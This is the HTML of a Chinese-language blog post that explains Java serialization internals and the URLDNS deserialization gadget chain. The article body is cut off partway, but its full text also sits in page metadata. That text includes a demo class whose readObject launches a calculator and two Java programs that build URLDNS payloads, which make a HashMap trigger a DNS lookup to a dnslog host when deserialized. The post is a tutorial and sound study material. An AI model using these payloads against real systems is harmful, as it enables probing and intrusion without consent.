@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Java反序列化漏洞(一) 前置知识&amp;URLDNS | Reus09&#39;s Blog</title>
+<meta name="keywords" content="反序列化漏洞">
+<meta name="description" content="跟着su18师傅和p神继续学习Java安全，在之前对FastJson的分析中，FastJson的序列化漏洞主要是对对象反序列化过程中gett">
+<meta name="author" content="Reus09">
+<link rel="canonical" href="/en/posts/tech/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86urldns/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Java反序列化漏洞(一) 前置知识&amp;URLDNS" />
+<meta property="og:description" content="跟着su18师傅和p神继续学习Java安全，在之前对FastJson的分析中，FastJson的序列化漏洞主要是对对象反序列化过程中gett" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/en/posts/tech/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86urldns/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-24T15:47:17+08:00" />
+<meta property="article:modified_time" content="2022-10-24T15:47:17+08:00" /><meta property="og:site_name" content="(〃&#39;▽&#39;〃)" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Java反序列化漏洞(一) 前置知识&amp;URLDNS"/>
+<meta name="twitter:description" content="跟着su18师傅和p神继续学习Java安全，在之前对FastJson的分析中，FastJson的序列化漏洞主要是对对象反序列化过程中gett"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  5 ,
+      "name": "Java反序列化漏洞(一) 前置知识\u0026URLDNS",
+      "item": "/en/posts/tech/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86urldns/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Java反序列化漏洞(一) 前置知识\u0026URLDNS",
+  "name": "Java反序列化漏洞(一) 前置知识\u0026URLDNS",
+  "description": "跟着su18师傅和p神继续学习Java安全，在之前对FastJson的分析中，FastJson的序列化漏洞主要是对对象反序列化过程中gett",
+  "keywords": [
+    "反序列化漏洞"
+  ],
+  "articleBody": "跟着su18师傅和p神继续学习Java安全，在之前对FastJson的分析中，FastJson的序列化漏洞主要是对对象反序列化过程中getter,setter方法的利用，这里学习的反序列化主要是继承了Serializable接口，重写了readObject方法的反序列化的利用。\n序列化和反序列化 Java 中的序列化与反序列化，就是将一个 Java 对象当前状态以字符串（字节序列）的形式描述出来，这串字符可能被储存/发送到任何需要的位置，在适当的时候，再将它转回原本的 Java 对象。\n这中间需要一个规则，规则中描述了序列化和反序列化时究竟该如何把一个对象处理成字符串，又如何把字符串变回对象，因为这一过程必须是可逆的。\nJava 提供了两个类 java.io.ObjectOutputStream 和 java.io.ObjectInputStream 来实现序列化和反序列化的功能，其中 ObjectInputStream 用于恢复那些已经被序列化的对象，ObjectOutputStream 将 Java 对象的原始数据类型和图形写入 OutputStream。\n在 Java 的类中，必须要实现 java.io.Serializable 或 java.io.Externalizable 接口才可以使用，而实际上 Externalizable 也是实现了 Serializable 接口。\nObjectOutputStream ObjectOutputStream 继承的父类或实现的接口如下：\n父类 OutputStream：所有字节输出流的顶级父类，用来接收输出的字节并发送到某些接收器（sink）。 接口 ObjectOutput：ObjectOutput 扩展了 DataOutput 接口，DataOutput 接口提供了将数据从任何 Java 基本类型转换为字节序列并写入二进制流的功能，ObjectOutput 在 DataOutput 接口基础上提供了 writeObject 方法，也就是类（Object）的写入。 接口 ObjectStreamConstants：定义了一些在对象序列化时写入的常量。常见的一些的比如 STREAM_MAGIC、STREAM_VERSION 等。 通过这个类的父类及父接口，我们大概可以理解这个类提供的功能：能将 Java 中的类、数组、基本数据类型等对象转换为可输出的字节，也就是反序列化。接下来看一下这个类中几个关键方法。\nwriteObject 这是 ObjectOutputStream 对象的核心方法之一，用来将一个对象写入输出流中，任何对象，包括字符串和数组，都是用 writeObject 写入到流中的。\n之前说过，序列化的过程，就是将一个对象当前的状态描述为字节序列的过程，也就是 Object -\u003e OutputStream 的过程，这个过程由 writeObject 实现。writeObject 方法负责为指定的类编写其对象的状态，以便在后面可以使用与之对应 readObject 方法来恢复它。\nwriteUnshared 用于将非共享对象写入 ObjectOutputStream，并将给定的对象作为刷新对象写入流中。\n使用 writeUnshared 方法会使用 BlockDataOutputStream 的新实例进行序列化操作，不会使用原来 OutputStream 的引用对象。\nwriteObject0 writeObject 和 writeUnshared 实际上调用 writeObject0 方法，也就是说 writeObject0是上面两个方法的基础实现。具体的实现流程将会在后面再进行详细研究。\nwriteObjectOverride 如果 ObjectOutputStream 中的 enableOverride 属性为 true，writeObject 方法将会调用 writeObjectOverride，这个方法是由 ObjectOutputStream 的子类实现的。\n在由完全重新实现 ObjectOutputStream 的子类完成序列化功能时，将会调用实现类的 writeObjectOverride 方法进行处理。\nObjectInputStream ObjectInputStream 继承的父类或实现的接口如下：\n父类 InputStream：所有字节输入流的顶级父类。 接口 ObjectInput：ObjectInput 扩展了 DataInput 接口，DataInput 接口提供了从二进制流读取字节并将其重新转换为 Java 基础类型的功能，ObjectInput 额外提供了 readObject 方法用来读取类。 接口 ObjectStreamConstants：同上。 ObjectInputStream 实现了反序列化功能，看一下其中的关键方法。\nreadObject 从 ObjectInputStream 读取一个对象，将会读取对象的类、类的签名、类的非 transient 和非 static 字段的值，以及其所有父类类型。\n我们可以使用 writeObject 和 readObject 方法为一个类重写默认的反序列化执行方，所以其中 readObject 方法会 “传递性” 的执行，也就是说，在反序列化过程中，会调用反序列化类的 readObject 方法，以完整的重新生成这个类的对象。\nreadUnshared 从 ObjectInputStream 读取一个非共享对象。 此方法与 readObject 类似，不同点在于readUnshared 不允许后续的 readObject 和 readUnshared 调用引用这次调用反序列化得到的对象。\nreadObject0 readObject 和 readUnshared 实际上调用 readObject0 方法，readObject0是上面两个方法的基础实现。\nreadObjectOverride 由 ObjectInputStream 子类调用，与 writeObjectOverride 一致。\n通过上面对 ObjectOutputStream 和 ObjectInputStream 的了解，两个类的实现几乎是一种对称的、双生的方式进行。\n反序列化漏洞 在前面提到过，一个类想要实现序列化和反序列化，必须要实现 java.io.Serializable 或 java.io.Externalizable 接口。\nSerializable 接口是一个标记接口，标记了这个类可以被序列化和反序列化，而 Externalizable 接口在 Serializable 接口基础上，又提供了 writeExternal 和 readExternal 方法，用来序列化和反序列化一些外部元素。\n其中，如果被序列化的类重写了 writeObject 和 readObject 方法，Java 将会委托使用这两个方法来进行序列化和反序列化的操作。\n正是因为这个特性，导致反序列化漏洞的出现：在反序列化一个类时，如果其重写了 readObject 方法，程序将会调用它，如果这个方法中存在一些恶意的调用，则会对应用程序造成危害。\n这里，我们以一个demo程序为例子，编写了Person类，继承了Serializable接口，并且在readObject方法中重写了恶意代码，使其能够弹出计算器框。\n然后我们将这个类序列化并写在文件中，随后对其进行反序列化，就触发了命令执行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package Basic; import java.io.*; /** * @ClassName Person * @Description TODO * @Author reus09 * @Date 2022/10/23 15:15 * @Version 1.0 **/ public class Person implements Serializable { private String name; private int age; public Person(String name, int age) throws IOException { this.name = name; this.age = age; } private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { Runtime.getRuntime().exec(\"open -a Calculator.app\"); } public static void main(String[] args) throws IOException, ClassNotFoundException { Person person = new Person(\"reus09\", 21); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"abc.txt\")); oos.writeObject(person); oos.close(); FileInputStream fis = new FileInputStream(\"abc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } readObject的具体流程 为什么readObject会触发反序列化呢，我们具体走一下流程，看一下具体每个步骤的代码。\n首先，在readObject方法中调用了readObject0方法反序列化字符串。\n然后readObject0是以字节的方式去读数据，如果读取到0x73，则代表这是一个对象的序列化数据，将会调用 readOrdinaryObject 方法进行处理\n然后在readOrdinaryObject方法中，先调用readClassDesc读取类描述符，并根据其中的内容进行一些条件判断，比如是否是String,Class,ObjectStreamClass的类，然后判断其继承的是否是Externalizable接口，如果是就执行readExternalData方法，否则就执行readSerialData方法。\n在readSerialData方法中，通过类描述符的getClassDataLayout方法获得了序列化对象的数据布局，通过布局的 hasReadObjectMethod 方法判断对象是否有重写 readObject 方法，如果有，则使用 invokeReadObject 方法调用对象中的 readObject 。\n最后在invokeReadObject方法中经过一系列初始化的调用，最后执行我们反序列化后的对象的readObject方法。\n通过上述分析，我们就了解了反序列化漏洞的触发原因。与反序列漏洞的触发方式相同，在序列化时，如果一个类重写了 writeObject 方法，并且其中产生恶意调用，则将会导致漏洞，当然在实际环境中，序列化的数据来自不可信源的情况比较少见。\nURLDNS 根据su18师傅所描述，一个能成功执行的反序列化调用链需要三个元素：“kick-off”、“sink”、“chain”。翻译成中文来说就是 “入口点（重写了 readObject 的类）”、“sink 点（最终执行恶意动作的点：RCE）”、“chain （中间的调用链）”。\nURLDNS 是适合新手分析的反序列化链，只依赖原生类，没有 jdk 版本限制，也被 ysoserial 涵盖在其中。它不会执行命令，只会触发 DNS 解析，因此通常用来探测是否存在反序列化漏洞。\n这个漏洞关键点是 Java 内置的 java.net.URL 类，这个类的 equals 和 hashCode 方法具有一个有趣的特性：在对 URL 对象进行比较时（使用 equals 方法或 hashCode 方法），会触发一次 DNS 解析，因为对于 URL 来说，如果两个主机名（host）都可以解析为相同的 IP 地址，则这两个主机会被认为是相同的。\n下面我们着重分析一下equals方法和hashCode方法，学习一下为什么它能够触发DNS解析。\nURL.equals 首先在URL#equals方法重写了对Object的判断，如果obj不是URL类，直接返回false，然后调用java.net.URLStreamHandler#equals进行判断。\nURLStreamHandler#equals 方法判断 URL 对象的锚点是否相同，并调用 sameFile 方法比较两个 URL，看它们是否引用了相同的 protocol(协议)、host(主机)、port(端口)、path(路径)。\nsameFile同时还调用了hostsEquals来查看其host主机是否相同。\n在hostEqual方法中，调用了getHostAddress方法来获取主机的地址。\n在getHostAddress方法中通过getByName相当于将传入的host进行dns解析，获取IP,从而实现了触发DNS解析\nURL.hashcode 此方法将一个对象映射为一个整型的值，通常与 equals 方法同时出现。\n当 equals 方法被重写时，hashCode 也需要被重写。按照一般 hashCode 方法的实现来说，如果两个对象通过 equals 方法判断相同，那它们的 hash code 一定相等。\nURL 的 hashCode 方法也进行了重写，调用了 URLStreamHandler#hashCode 方法。在此之前有一个判断，那就是 hashCode != -1，\n同样在URLStreamHandler#hashCode方法中，调用了getHostAddress方法来实现DNS解析。\nKick-off:HashMap 上面关于URL触发DNS解析的equal,hashcode方法实际上就是这条反序列化链的sink,那么我们怎么建立一个kick-off来作为这条链的入口，就牵扯到主角java.util.HashMap,同样继承了Serializable接口。\n那么我们就看一下HashMap是如何在readObject方法中存在我们的kick-off点.\n省略掉前面各种初始化的代码，将序列化对象中的键值进行 for 循环，并调用里面的 key 和 value 对象的 readObject 方法反序列化 key 和 value 的值后，使用 putVal (1.7 是 putForCreate 方法) 将这些键、值以及相关的 hash 等信息写入 HashMap 的属性 table 中。\nHashMap 通过一个静态方法 hash 计算 key 对象的 hash 值，如果 key 为 null， 则值为 0 ，否则将调用 key 的 hashCode 方法计算 hashCode 值，再和位移 16 位的结果进行异或得出 hash 值。\n也就是说，在反序列化一个 HashMap 时，会调用其中的 key 对象的 hashCode 方法计算 hash 值。如果反序列化一个 HashMap 对象中的 key 是URL对象，在反序列化时就会调用这个 URL 对象的 hashCode 方法，触发 DNS 解析查询。这个逻辑就是 URLDNS 这条反序列化利用的 gadget 的基本原理。\n注意点 1、在使用 HashMap 的 put 方法时，也是调用 putVal 方法，会对 key 进行 hash，触发解析。如果我们不想在生成 payload 时触发 DNS 解析，就要使用反射将值放进去。\n2、在 URL 对象有一个属性 hashCode，默认是 -1，使用hashCode 方法计算时会在 hashCode 属性中缓存已经计算过的值，如果再次计算将直接返回值，不会在触发 URLStreamHandler 的 hashCode 方法，也就不会触发漏洞。所以我们需要在生成的 HashMap 中的 URL 参数的 hashCode 值在反序列化时为 -1，而刚才说过，如果使用 put 方法，会调用一次 key 的 hash 计算，也就是 URL 的 hashCode 方法，这样就把 hashCode 缓存了，在反序列化时就不会触发 URLStreamHandler 的 hashCode 方法以及后面的逻辑。\n所以有两种思路解决这个问题：\n直接反射调用 HashMap 的 putVal 方法绕过 hash 计算。（由于 JDK 1.7 中方法名不一样，细节也不一样，所以不具有通用性） 使用HashMap的put方法，将URL对象放到HashMap的Key之前，先对其hashcode进行修改，使其不为-1,放入HashMap之后，通过反射将hashcode修改为-1。 第一种思路的代码实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class URLDNS { public static void main(String[] args) throws Exception { HashMap hashMap = new HashMap\u003c\u003e(); URL url = new URL(\"http://reus09.zmz0xr.ceye.io\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url, 0x01010101); hashMap.put(url, 0); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"urldns.bin\")); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"urldns.bin\")); ois.readObject(); } } 第二种思路的代码实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class URLDNS2 { public static void main(String[] args) throws Exception { HashMap hashMap = new HashMap\u003c\u003e(); URL url = new URL(\"http://reus09.zmz0xr.ceye.io\"); Method[] m = Class.forName(\"java.util.HashMap\").getDeclaredMethods(); for (Method method : m) { if (method.getName().equals(\"putVal\")) { method.setAccessible(true); method.invoke(hashMap, -1, url, 0, false, true); } } ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"urldns2.bin\")); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"urldns2.bin\")); ois.readObject(); } } 根据ceye提供的一个dnslog平台，我们可以验证是可以成功触发DNS解析的\n看一下ysoserial实现方法\n实际上就是继承了一个URLStreamHandler的类，在初始化 URL 对象时传入，那么在 HashMap 的 put 方法触发的 hash 计算在调用到 URLStreamHandler 的getHostAddress 方法时将调用我们自定义的 SilentURLStreamHandler 的 getHostAddress，不会触发 DNS 查询，而 put 之后则是通过反射将 URL 对象的 hashCode 的值重新改为 -1。\n总结 利用说明： 要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap 中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算 其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-\u003ehashCode() 。 Gadget 总结： kick-off gadget：java.util.HashMap#readObject() sink gadget：java.net.URL#hashCode() chain gadget：无 调用链展示： 1 2 3 4 5 6 7 8 HashMap.readObject() HashMap.put() HashMap.putVal() HashMap.hash() URL.hashCode() URLStreamHandler.hashCode() URLStreamHandler.getHostAddress() InetAddress.getByName() ",
+  "wordCount" : "5024",
+  "inLanguage": "en",
+  "datePublished": "2022-10-24T15:47:17+08:00",
+  "dateModified": "2022-10-24T15:47:17+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "Reus09"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "/en/posts/tech/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86urldns/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Reus09's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="en/" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="en/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="en/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="en/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="en/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="en/categories" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="en/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="en/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="en/">Home</a></div>
+    <h1 class="post-title">
+      Java反序列化漏洞(一) 前置知识&amp;URLDNS
+    </h1>
+    <div class="post-meta"><span title='2022-10-24 15:47:17 +0800 +0800'>2022-10-24</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;Reus09
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e5%ba%8f%e5%88%97%e5%8c%96%e5%92%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="序列化和反序列化">序列化和反序列化</a><ul>
+                            
+                    <li>
+                        <a href="#objectoutputstream" aria-label="ObjectOutputStream">ObjectOutputStream</a><ul>
+                            
+                    <li>
+                        <a href="#writeobject" aria-label="writeObject">writeObject</a></li>
+                    <li>
+                        <a href="#writeunshared" aria-label="writeUnshared">writeUnshared</a></li>
+                    <li>
+                        <a href="#writeobject0" aria-label="writeObject0">writeObject0</a></li>
+                    <li>
+                        <a href="#writeobjectoverride" aria-label="writeObjectOverride">writeObjectOverride</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#objectinputstream" aria-label="ObjectInputStream">ObjectInputStream</a><ul>
+                            
+                    <li>
+                        <a href="#readobject" aria-label="readObject">readObject</a></li>
+                    <li>
+                        <a href="#readunshared" aria-label="readUnshared">readUnshared</a></li>
+                    <li>
+                        <a href="#readobject0" aria-label="readObject0">readObject0</a></li>
+                    <li>
+                        <a href="#readobjectoverride" aria-label="readObjectOverride">readObjectOverride</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" aria-label="反序列化漏洞">反序列化漏洞</a><ul>
+                            
+                    <li>
+                        <a href="#readobject%e7%9a%84%e5%85%b7%e4%bd%93%e6%b5%81%e7%a8%8b" aria-label="readObject的具体流程"><code>readObject</code>的具体流程</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#urldns" aria-label="URLDNS">URLDNS</a><ul>
+                            
+                    <li>
+                        <a href="#urlequals" aria-label="URL.equals"><code>URL.equals</code></a></li>
+                    <li>
+                        <a href="#urlhashcode" aria-label="URL.hashcode"><code>URL.hashcode</code></a></li>
+                    <li>
+                        <a href="#kick-offhashmap" aria-label="Kick-off:HashMap"><code>Kick-off</code>:<code>HashMap</code></a></li>
+                    <li>
+                        <a href="#%e6%b3%a8%e6%84%8f%e7%82%b9" aria-label="注意点">注意点</a></li>
+                    <li>
+                        <a href="#%e6%80%bb%e7%bb%93" aria-label="总结">总结</a>
+                    </li>
+                </ul>
+                </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+         
+         activeElement = elements[0];
+         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+     }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+             const id = encodeURI(element.getAttribute('id')).toLowerCase();
+             if (element === activeElement){
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+             } else {
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+             }
+         })
+     }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+</script>
+
+  <div class="post-content"><p>跟着<code>su18</code>师傅和p神继续学习Java安全，在之前对<code>FastJson</code>的分析中，<code>FastJson</code>的序列化漏洞主要是对对象反序列化过程中<code>getter</code>,<code>setter</code>方法的利用，这里学习的反序列化主要是继承了<code>Serializable</code>接口，重写了<code>readObject</code>方法的反序列化的利用。</p>
+<h2 id="序列化和反序列化">序列化和反序列化<a hidden class="anchor" aria-hidden="true" href="#序列化和反序列化">#</a></h2>
+<p>Java 中的序列化与反序列化，就是将一个 Java 对象当前状态以字符串（字节序列）的形式描述出来，这串字符可能被储存/发送到任何需要的位置，在适当的时候，再将它转回原本的 Java 对象。</p>
+<p>这中间需要一个规则，规则中描述了序列化和反序列化时究竟该如何把一个对象处理成字符串，又如何把字符串变回对象，因为这一过程必须是可逆的。</p>
+<p>Java 提供了两个类 <code>java.io.ObjectOutputStream</code> 和 <code>java.io.ObjectInputStream</code> 来实现序列化和反序列化的功能，其中 ObjectInputStream 用于恢复那些已经被序列化的对象，ObjectOutputStream 将 Java 对象的原始数据类型和图形写入 OutputStream。</p>
+<p>在 Java 的类中，必须要实现 <code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口才可以使用，而实际上 Externalizable 也是实现了 Serializable 接口。</p>
+<h3 id="objectoutputstream">ObjectOutputStream<a hidden class="anchor" aria-hidden="true" href="#objectoutputstream">#</a></h3>
+<p>ObjectOutputStream 继承的父类或实现的接口如下：</p>
+<ul>
+<li>父类 OutputStream：所有字节输出流的顶级父类，用来接收输出的字节并发送到某些接收器（sink）。</li>
+<li>接口 ObjectOutput：ObjectOutput 扩展了 DataOutput 接口，DataOutput 接口提供了将数据从任何 Java 基本类型转换为字节序列并写入二进制流的功能，ObjectOutput 在 DataOutput 接口基础上提供了 <code>writeObject</code> 方法，也就是类（Object）的写入。</li>
+<li>接口 ObjectStreamConstants：定义了一些在对象序列化时写入的常量。常见的一些的比如 <code>STREAM_MAGIC</code>、<code>STREAM_VERSION</code> 等。</li>
+</ul>
+<p>通过这个类的父类及父接口，我们大概可以理解这个类提供的功能：能将 Java 中的类、数组、基本数据类型等对象转换为可输出的字节，也就是反序列化。接下来看一下这个类中几个关键方法。</p>
+<h4 id="writeobject">writeObject<a hidden class="anchor" aria-hidden="true" href="#writeobject">#</a></h4>
+<p>这是 ObjectOutputStream 对象的核心方法之一，用来将一个对象写入输出流中，任何对象，包括字符串和数组，都是用 <code>writeObject</code> 写入到流中的。</p>
+<p>之前说过，序列化的过程，就是将一个对象当前的状态描述为字节序列的过程，也就是 Object -&gt; OutputStream 的过程，这个过程由 <code>writeObject</code> 实现。<code>writeObject</code> 方法负责为指定的类编写其对象的状态，以便在后面可以使用与之对应 <code>readObject</code> 方法来恢复它。</p>
+<h4 id="writeunshared">writeUnshared<a hidden class="anchor" aria-hidden="true" href="#writeunshared">#</a></h4>
+<p>用于将非共享对象写入 ObjectOutputStream，并将给定的对象作为刷新对象写入流中。</p>
+<p>使用 <code>writeUnshared</code> 方法会使用 BlockDataOutputStream 的新实例进行序列化操作，不会使用原来 OutputStream 的引用对象。</p>
+<h4 id="writeobject0">writeObject0<a hidden class="anchor" aria-hidden="true" href="#writeobject0">#</a></h4>
+<p><code>writeObject</code> 和 <code>writeUnshared</code> 实际上调用 <code>writeObject0</code> 方法，也就是说 <code>writeObject0</code>是上面两个方法的基础实现。具体的实现流程将会在后面再进行详细研究。</p>
+<h4 id="writeobjectoverride">writeObjectOverride<a hidden class="anchor" aria-hidden="true" href="#writeobjectoverride">#</a></h4>
+<p>如果 ObjectOutputStream 中的 enableOverride 属性为 true，<code>writeObject</code> 方法将会调用 <code>writeObjectOverride</code>，这个方法是由 ObjectOutputStream 的子类实现的。</p>
+<p>在由完全重新实现 ObjectOutputStream 的子类完成序列化功能时，将会调用实现类的 <code>writeObjectOverride</code> 方法进行处理。</p>
+<h3 id="objectinputstream">ObjectInputStream<a hidden class="anchor" aria-hidden="true" href="#objectinputstream">#</a></h3>
+<p>ObjectInputStream 继承的父类或实现的接口如下：</p>
+<ul>
+<li>父类 InputStream：所有字节输入流的顶级父类。</li>
